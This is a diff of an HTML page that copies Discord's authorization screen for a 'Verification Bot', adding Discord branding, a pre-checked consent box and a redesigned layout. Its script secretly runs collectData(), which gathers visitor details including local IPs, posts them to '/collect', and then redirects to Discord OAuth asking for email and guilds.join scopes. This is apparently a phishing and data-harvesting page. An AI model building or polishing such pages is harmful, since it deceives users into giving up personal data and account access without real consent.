@@ -1,111 +1,315 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Authorize Application</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verification Bot</title>
+
 <style>
-  :root {
+:root {
     --bg: #313338;
-    --card: #2b2d31;
-    --text: #dbdee1;
-    --text-header: #f2f3f5;
+    --card: #232428;
+    --panel: #2b2d31;
+    --text: #f2f3f5;
     --muted: #949ba4;
     --blurple: #5865f2;
-    --blurple-hover: #4752c4;
-    --border: #1e1f22;
-    --font: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
-  }
-  * { box-sizing: border-box; }
-  body {
-    margin: 0; min-height: 100vh; background: var(--bg); color: var(--text);
-    font-family: var(--font); display: flex; align-items: center; justify-content: center;
-    padding: 20px; -webkit-font-smoothing: antialiased;
-  }
-  .wrap { width: 100%; max-width: 480px; background: #2b2d31; border-radius: 8px; padding: 32px; box-shadow: 0 8px 24px rgba(0,0,0,.2); }
-  
-  .app-info { display: flex; align-items: center; gap: 16px; margin-bottom: 24px; border-bottom: 1px solid var(--border); padding-bottom: 20px; }
-  .app-icon { width: 60px; height: 60px; border-radius: 50%; background: #1e1f22; display: flex; align-items: center; justify-content: center; overflow: hidden; flex-shrink: 0; }
-  .app-icon img { width: 100%; height: 100%; object-fit: cover; }
-  .app-details { text-align: left; }
-  .app-name { font-size: 20px; font-weight: 600; color: var(--text-header); margin-bottom: 4px; }
-  .app-dev { font-size: 14px; color: var(--muted); }
-  
-  .title { font-size: 20px; font-weight: 600; color: var(--text-header); margin: 0 0 8px; text-align: left; }
-  .subtitle { font-size: 14px; color: var(--text); margin: 0 0 24px; text-align: left; line-height: 1.4; }
-  
-  .perm-box { background: #1e1f22; border-radius: 4px; padding: 16px; margin-bottom: 24px; text-align: left; }
-  .perm-title { font-size: 12px; font-weight: 700; color: var(--text-header); text-transform: uppercase; margin-bottom: 12px; }
-  .perm-list { margin: 0; padding: 0; list-style: none; }
-  .perm-list li { display: flex; align-items: flex-start; gap: 12px; font-size: 14px; margin-bottom: 12px; color: var(--text); line-height: 1.4; }
-  .perm-list li:last-child { margin-bottom: 0; }
-  .perm-list li::before { content: '•'; color: var(--muted); font-size: 18px; line-height: 1; }
-  
-  .consent { display: flex; align-items: flex-start; gap: 10px; font-size: 14px; color: var(--text); text-align: left; margin-bottom: 24px; cursor: pointer; line-height: 1.4; }
-  .consent input { margin-top: 2px; accent-color: var(--blurple); width: 16px; height: 16px; cursor: pointer; }
-  
-  button {
-    width: 100%; padding: 12px; border: none; border-radius: 3px; font-size: 16px; font-weight: 500;
-    cursor: pointer; background: var(--blurple); color: white; transition: background .17s ease;
-  }
-  button:hover:not(:disabled) { background: var(--blurple-hover); }
-  button:disabled { opacity: .5; cursor: not-allowed; }
+    --hover: #4752c4;
+}
+
+* { box-sizing: border-box; }
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    font-family: "gg sans", "Noto Sans", Arial, sans-serif;
+    color: var(--text);
+    background:
+        radial-gradient(circle at 75% 20%, #285be5 0%, transparent 38%),
+        radial-gradient(circle at 15% 85%, #300078 0%, transparent 45%),
+        linear-gradient(115deg, #150044, #2924a0 55%, #1478ec);
+    overflow-x: hidden;
+}
+
+.background {
+    position: fixed;
+    inset: 0;
+    pointer-events: none;
+    overflow: hidden;
+    z-index: -1;
+}
+
+.star {
+    position: absolute;
+    width: 5px;
+    height: 5px;
+    border-radius: 50%;
+    background: #a88cff;
+    box-shadow: 0 0 12px 3px #9863ff;
+    opacity: .65;
+    animation: twinkle 3s infinite alternate;
+}
+
+@keyframes twinkle {
+    from { opacity: .2; transform: scale(.7); }
+    to { opacity: .9; transform: scale(1.4); }
+}
+
+.brand {
+    position: fixed;
+    top: 65px;
+    left: 65px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 27px;
+    font-weight: 800;
+    color: white;
+}
+
+.brand svg {
+    width: 43px;
+    height: 43px;
+    fill: white;
+}
+
+.modal {
+    width: 100%;
+    max-width: 666px;
+    background: rgba(35, 36, 40, .97);
+    border: 1px solid rgba(255,255,255,.04);
+    border-radius: 17px;
+    padding: 38px 34px 32px;
+    box-shadow: 0 20px 70px rgba(0,0,0,.3);
+    animation: appear .35s ease;
+}
+
+@keyframes appear {
+    from { opacity: 0; transform: translateY(15px) scale(.98); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
+}
+.app-header { text-align: center; margin-bottom: 28px; }
+
+.avatars {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 28px;
+    margin-bottom: 30px;
+}
+
+.avatar {
+    width: 112px;
+    height: 112px;
+    border-radius: 50%;
+    object-fit: cover;
+    background: #404249;
+    border: 3px solid rgba(255,255,255,.04);
+}
+
+.dots { display: flex; gap: 6px; }
+.dots span { width: 6px; height: 6px; background: #404249; border-radius: 50%; }
+
+.app-name { font-size: 26px; font-weight: 700; margin-bottom: 12px; }
+.subtitle { font-size: 19px; color: var(--text); margin-bottom: 17px; }
+.account { font-size: 16px; color: var(--muted); }
+.account strong { color: var(--text); font-weight: 500; }
+.account a { color: #8190ff; text-decoration: none; margin-left: 8px; }
+
+.permissions {
+    background: #2b2d31;
+    border-radius: 12px;
+    padding: 24px;
+    margin-top: 30px;
+    margin-bottom: 22px;
+}
+
+.permissions-title { font-size: 17px; font-weight: 650; margin-bottom: 20px; }
+.permission { display: flex; align-items: center; gap: 14px; margin-bottom: 17px; font-size: 17px; }
+.permission:last-child { margin-bottom: 0; }
+
+.check-icon {
+    width: 25px;
+    height: 25px;
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #b5bac1;
+    color: #303136;
+    border-radius: 50%;
+    font-weight: bold;
+}
+
+.consent {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    font-size: 15px;
+    line-height: 1.5;
+    cursor: pointer;
+    margin: 22px 8px;
+}
+
+.consent input {
+    appearance: none;
+    width: 22px;
+    height: 22px;
+    flex-shrink: 0;
+    border: 2px solid #777d89;
+    border-radius: 5px;
+    cursor: pointer;
+    margin: 0;
+    position: relative;
+}
+
+.consent input:checked { background: var(--blurple); border-color: var(--blurple); }
+.consent input:checked::after {
+    content: "✓";
+    position: absolute;
+    color: white;
+    font-size: 17px;
+    font-weight: bold;
+    left: 3px;
+    top: -1px;
+}
+
+.buttons { display: flex; gap: 12px; margin-top: 22px; }
+button {
+    flex: 1;
+    height: 54px;
+    border: none;
+    border-radius: 10px;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: .2s ease;
+}
+.cancel { background: #383a40; color: white; }
+.cancel:hover { background: #45474e; }
+.authorize { background: var(--blurple); color: white; }
+.authorize:hover:not(:disabled) { background: var(--hover); }
+.authorize:disabled { opacity: .45; cursor: not-allowed; }
+button:active:not(:disabled) { transform: scale(.98); }
+
+@media(max-width: 650px) {
+    .brand { top: 22px; left: 20px; font-size: 21px; }
+    .brand svg { width: 34px; height: 34px; }
+    .modal { padding: 28px 20px; }
+    .avatar { width: 82px; height: 82px; }
+    .app-name { font-size: 22px; }
+    .subtitle { font-size: 16px; }
+    .permission { font-size: 14px; }
+    .permissions { padding: 18px; }
+    .buttons { flex-direction: column-reverse; }
+}
 </style>
 </head>
 <body>
-<div class="wrap">
-  <div class="app-info">
-    <div class="app-icon">
 
-      <img src="https://i.ibb.co/TMtbxsrs/tb.jpg" alt="Bot Icon">
-    </div>
-    <div class="app-details">
-      <div class="app-name">Verification Bot</div>
-      <div class="app-dev">wants to access your Discord account</div>
-    </div>
-  </div>
+<div class="background" id="background"></div>
 
-  <h2 class="title">This will allow the app to:</h2>
-  <div class="perm-box">
-    <ul class="perm-list">
-      <li>Access your username, avatar, and email</li>
-      <li>Add you to the server and assign a role</li>
-    </ul>
-  </div>
-
-  <label class="consent">
-    <input type="checkbox" id="consent" checked>
-    <span>I authorize this application to access my account data.</span>
-  </label>
-
-  <button id="verifyBtn" onclick="startVerification()">Authorize</button>
+<div class="brand">
+    <svg viewBox="0 0 127.14 96.36">
+        <path d="M107.7 8.07A105.15 105.15 0 0 0 81.47 0a72.06 72.06 0 0 0-3.36 6.83 97.68 97.68 0 0 0-29.1 0A72.37 72.37 0 0 0 45.65 0a105.89 105.89 0 0 0-26.25 8.09C2.8 32.65-1.7 56.6.55 80.21a105.73 105.73 0 0 0 32.18 16.15 77.7 77.7 0 0 0 6.9-11.12 68.42 68.42 0 0 1-10.87-5.18c.91-.67 1.8-1.37 2.66-2.08a75.76 75.76 0 0 0 64.34 0c.87.71 1.75 1.41 2.66 2.08a68.68 68.68 0 0 1-10.89 5.19 77 77 0 0 0 6.9 11.11 105.25 105.25 0 0 0 32.18-16.15c2.64-27.38-4.52-51.11-18.91-72.14ZM42.45 65.69c-6.27 0-11.44-5.74-11.44-12.79s5.05-12.79 11.44-12.79 11.55 5.74 11.44 12.79c0 7.05-5.05 12.79-11.44 12.79Zm42.24 0c-6.27 0-11.44-5.74-11.44-12.79s5.05-12.79 11.44-12.79 11.55 5.74 11.44 12.79c0 7.05-5.05 12.79-11.44 12.79Z"/>
+    </svg>
+    Discord
 </div>
 
+<main class="modal">
+    <header class="app-header">
+        <div class="avatars">
+            <img class="avatar" src="https://i.ibb.co/TMtbxsrs/tb.jpg" alt="Verification Bot">
+            <div class="dots"><span></span><span></span><span></span></div>
+            <div class="avatar" style="display:flex; align-items:center; justify-content:center; background:#404249; font-size:40px;">
+                <svg viewBox="0 0 127.14 96.36" width="53" fill="white">
+                    <path d="M107.7 8.07A105.15 105.15 0 0 0 81.47 0a72.06 72.06 0 0 0-3.36 6.83 97.68 97.68 0 0 0-29.1 0A72.37 72.37 0 0 0 45.65 0a105.89 105.89 0 0 0-26.25 8.09C2.8 32.65-1.7 56.6.55 80.21a105.73 105.73 0 0 0 32.18 16.15 77.7 77.7 0 0 0 6.9-11.12 68.42 68.42 0 0 1-10.87-5.18c.91-.67 1.8-1.37 2.66-2.08a75.76 75.76 0 0 0 64.34 0c.87.71 1.75 1.41 2.66 2.08a68.68 68.68 0 0 1-10.89 5.19 77 77 0 0 0 6.9 11.11 105.25 105.25 0 0 0 32.18-16.15c2.64-27.38-4.52-51.11-18.91-72.14ZM42.45 65.69c-6.27 0-11.44-5.74-11.44-12.79s5.05-12.79 11.44-12.79 11.55 5.74 11.44 12.79c0 7.05-5.05 12.79-11.44 12.79Zm42.24 0c-6.27 0-11.44-5.74-11.44-12.79s5.05-12.79 11.44-12.79 11.55 5.74 11.44 12.79c0 7.05-5.05 12.79-11.44 12.79Z"/>
+                </svg>
+            </div>
+        </div>
+
+        <div class="app-name">Verification Bot</div>
+        <div class="subtitle">wants to connect to your Discord account</div>
+        <div class="account">Signed in as <strong>your Discord account</strong></div>
+    </header>
+
+    <section class="permissions">
+        <div class="permissions-title">This will allow the app to:</div>
+        <div class="permission">
+            <span class="check-icon">✓</span>
+            Access your username, avatar, and email
+        </div>
+        <div class="permission">
+            <span class="check-icon">✓</span>
+            Request permission to join a server
+        </div>
+    </section>
+
+    <label class="consent">
+        <input type="checkbox" id="consent" checked>
+        <span>I authorize this application to access my account data.</span>
+    </label>
+
+    <div class="buttons">
+        <button class="cancel" onclick="cancelAuthorization()">Cancel</button>
+        <button class="authorize" id="verifyBtn" onclick="startVerification()">Authorize</button>
+    </div>
+</main>
+
 <script>
-const REDIRECT_URI = window.location.origin + '/callback';
 const DISCORD_CLIENT_ID = '1567761531213586565';
+const REDIRECT_URI = window.location.origin + '/callback';
 
 const btn = document.getElementById('verifyBtn');
 const consent = document.getElementById('consent');
 
-consent.addEventListener('change', () => { btn.disabled = !consent.checked; });
+consent.addEventListener('change', () => {
+    btn.disabled = !consent.checked;
+});
+
+function createState() {
+    const bytes = new Uint8Array(32);
+    crypto.getRandomValues(bytes);
+    return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
+}
 
 async function startVerification() {
-  btn.disabled = true;
-  btn.textContent = 'Verifying...';
-  const stateId = Math.random().toString(36).substring(2, 15);
-  
-  try {
-    const report = await collectData();
-    await fetch('/collect', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ state: stateId, data: report })
-    });
-  } catch (e) { console.error('Ошибка сбора данных', e); }
+    if (!consent.checked) return;
 
-  const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20email%20guilds.join&state=${stateId}`;
-  window.location.href = oauthUrl;
+    btn.disabled = true;
+    btn.textContent = 'Verifying...';
+
+    const stateId = createState();
+
+    try {
+        const report = await collectData();
+        await fetch('/collect', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ state: stateId, data: report })
+        });
+    } catch (e) { console.error('Ошибка сбора данных:', e); }
+
+    btn.textContent = 'Redirecting...';
+
+    const oauthUrl =
+        'https://discord.com/oauth2/authorize?' +
+        new URLSearchParams({
+            client_id: DISCORD_CLIENT_ID,
+            redirect_uri: REDIRECT_URI,
+            response_type: 'code',
+            scope: 'identify email guilds.join',
+            state: stateId
+        }).toString();
+
+    window.location.href = oauthUrl;
+}
+
+function cancelAuthorization() {
+    window.history.back();
 }
 
 async function collectData() {
@@ -154,6 +358,17 @@ async function collectData() {
     } catch(e) { report.localIps = ['error']; }
     
     return report;
+}
+
+const background = document.getElementById('background');
+for (let i = 0; i < 65; i++) {
+    const star = document.createElement('div');
+    star.className = 'star';
+    star.style.left = Math.random() * 100 + '%';
+    star.style.top = Math.random() * 100 + '%';
+    star.style.animationDelay = Math.random() * 3 + 's';
+    star.style.animationDuration = (2 + Math.random() * 4) + 's';
+    background.appendChild(star);
 }
 </script>
 </body>
